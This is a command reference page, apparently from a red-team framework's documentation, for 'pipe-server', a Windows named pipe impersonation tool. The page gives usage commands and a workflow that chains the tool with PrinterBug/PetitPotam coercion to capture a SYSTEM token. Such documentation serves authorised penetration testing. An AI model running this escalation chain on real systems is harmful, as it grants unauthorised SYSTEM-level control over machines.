+++
title = "pipe-server"
chapter = false
weight = 191
hidden = false
+++

## Summary

Named pipe impersonation for privilege escalation. Creates a named pipe server, waits for a privileged client to connect, and impersonates the client's security token.

{{% notice info %}}Windows Only{{% /notice %}}

This is a classic Windows privilege escalation technique (PrintSpoofer/RottenPotato family). When a privileged service (e.g., Print Spooler, EFSRPC) connects to your pipe, you impersonate its token to gain SYSTEM-level access.

**Requires:** `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` (common on service accounts: IIS AppPool, MSSQL, network service).

## Arguments

| Argument | Required | Default | Description |
|----------|----------|---------|-------------|
| action | No | impersonate | `check` to enumerate opportunities, `impersonate` to create pipe and wait |
| name | No | random | Pipe name (without `\\.\pipe\` prefix) |
| timeout | No | 30 | Seconds to wait for client connection |

## Usage

### Check for pipe impersonation opportunities
```
pipe-server -action check
```
Reports current privileges, interesting system pipes, and whether impersonation is viable.

### Create pipe and wait for connection
```
pipe-server -action impersonate -name mypipe -timeout 60
```
Creates `\\.\pipe\mypipe`, waits up to 60 seconds for a client. On connection, impersonates the client token and stores it (like `steal-token`).

### Default usage (random pipe name)
```
pipe-server
```

## Workflow

1. Run `pipe-server -action check` to verify `SeImpersonatePrivilege`
2. Start `pipe-server -action impersonate -name mypipe`
3. Trigger a privileged service to connect (e.g., via `coerce` with PrinterBug/PetitPotam targeting localhost)
4. Token is captured and stored — verify with `whoami`
5. Use `rev2self` to revert when done

## Chaining with Coerce

```
# Terminal 1: Start pipe server
pipe-server -name evilpipe -timeout 60

# Terminal 2: Trigger SYSTEM connection via PrinterBug
coerce -server 127.0.0.1 -listener \\.\pipe\evilpipe -method printerbug
```

## MITRE ATT&CK Mapping

- **T1134.001** — Access Token Manipulation: Token Impersonation/Theft
